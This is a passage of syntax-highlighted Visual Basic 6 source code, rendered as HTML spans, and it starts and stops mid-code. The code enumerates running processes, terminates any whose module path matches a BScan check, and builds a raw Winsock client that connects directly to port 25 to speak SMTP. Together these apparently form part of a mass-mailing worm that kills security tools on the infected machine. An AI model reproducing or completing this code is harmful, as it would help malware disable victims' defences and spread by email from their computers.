</span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">EnumProcessModules</span><span class="sc6">(</span><span class="sc7">hProcess</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Modules</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cbNeeded2</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">EnumProcessModules</span><span class="sc6">(</span><span class="sc7">hProcess</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Modules</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">cbNeeded2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">cbNeeded2</span><span class="sc6">)</span><span class="sc0">
 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">ModuleName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">260</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc0">
</span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetModuleFileNameExA</span><span class="sc6">(</span><span class="sc7">hProcess</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Modules</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">ModuleName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">sModName</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left$</span><span class="sc6">(</span><span class="sc7">ModuleName</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lRet</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">BScan</span><span class="sc6">(</span><span class="sc7">sModName</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TerminateProcess</span><span class="sc6">(</span><span class="sc7">hProcess</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
 </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">lRet</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc6">(</span><span class="sc7">hProcess</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAGetAsyncError</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">WSAGetAsyncError</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HFFFF0000</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">&amp;H10000</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Hook</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">lpPrevWndProc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SetWindowLong</span><span class="sc6">(</span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GWL_WNDPROC</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">AddressOf</span><span class="sc0"> </span><span class="sc7">WindowProc</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">UnHook</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SetWindowLong</span><span class="sc6">(</span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GWL_WNDPROC</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpPrevWndProc</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WindowProc</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hw</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">uMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ReadBuffer</span><span class="sc6">(</span><span class="sc2">1000</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">e_err</span><span class="sc0">

</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">uMsg</span><span class="sc0">

 </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1025</span><span class="sc0">
 </span><span class="sc7">e_err</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WSAGetAsyncError</span><span class="sc6">(</span><span class="sc7">lParam</span><span class="sc6">)</span><span class="sc0">
 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">e_err</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">do_cancel</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
               
   </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0">
    </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">recv</span><span class="sc6">(</span><span class="sc7">mysock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ReadBuffer</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">StrConv</span><span class="sc6">(</span><span class="sc7">ReadBuffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbUnicode</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Val</span><span class="sc6">(</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">a</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">))</span><span class="sc0">
    </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">rtncode</span><span class="sc0">
     </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">550</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">551</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">552</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">553</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">554</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">451</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">452</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">do_cancel</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
            
 </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_CONNECT</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">mysock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Progress</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Progress</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

 </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc6">::</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">mysock</span><span class="sc6">)</span><span class="sc0">
 </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
 </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">

    </span><span class="sc7">WindowProc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CallWindowProc</span><span class="sc6">(</span><span class="sc7">lpPrevWndProc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hw</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">uMsg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">SetSockLinger</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">SockNum</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">OnOff</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">LingerTime</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">Linger</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">LingerType</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Linger.l_onoff</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OnOff</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Linger.l_linger</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">LingerTime</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">setsockopt</span><span class="sc6">(</span><span class="sc7">SockNum</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SOL_SOCKET</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SO_LINGER</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Linger</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">SetSockLinger</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
        
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">getsockopt</span><span class="sc6">(</span><span class="sc7">SockNum</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SOL_SOCKET</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SO_LINGER</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Linger</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">SetSockLinger</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetHostByNameAlias</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">phe</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">heDestHost</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">HostEnt</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">addrList</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">retIP</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc7">retIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">inet_addr</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">retIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
 </span><span class="sc7">phe</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">gethostbyname</span><span class="sc6">(</span><span class="sc7">hostname</span><span class="sc6">)</span><span class="sc0">
  </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">phe</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">heDestHost</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">phe</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hostent_size</span><span class="sc0">
    </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">addrList</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">heDestHost.h_addr_list</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc7">MemCopy</span><span class="sc0"> </span><span class="sc7">retIP</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">addrList</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">heDestHost.h_length</span><span class="sc0">
    </span><span class="sc3">Else</span><span class="sc0">
    </span><span class="sc7">retIP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0">
  </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
    
</span><span class="sc7">GetHostByNameAlias</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">retIP</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Err</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">GetHostByNameAlias</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">SendData</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vMessage</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Variant</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">TheMsg</span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc0">
            </span><span class="sc7">TheMsg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">StrConv</span><span class="sc6">(</span><span class="sc7">vMessage</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbFromUnicode</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">TheMsg</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">SendData</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">send</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">TheMsg</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">TheMsg</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc7">LBound</span><span class="sc6">(</span><span class="sc7">TheMsg</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">Host</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">HWndToMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SelectOps</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">sockin</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">sockaddr</span><span class="sc0">
</span><span class="sc7">sockin.sin_family</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">sockin.sin_port</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">htons</span><span class="sc6">(</span><span class="sc2">25</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">sockin.sin_port</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">sockin.sin_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetHostByNameAlias</span><span class="sc6">(</span><span class="sc7">Host</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">sockin.sin_addr</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INADDR_NONE</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">socket</span><span class="sc6">(</span><span class="sc2">2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">SOCK_STREAM</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">IPPROTO_TCP</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&lt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">SetSockLinger</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SOCKET_ERROR</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc7">ConnectSock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">INVALID_SOCKET</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">

</span><span class="sc7">SelectOps</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">FD_WRITE</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">FD_CONNECT</span><span class="sc0"> </span><span class="sc3">Or</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0">
 
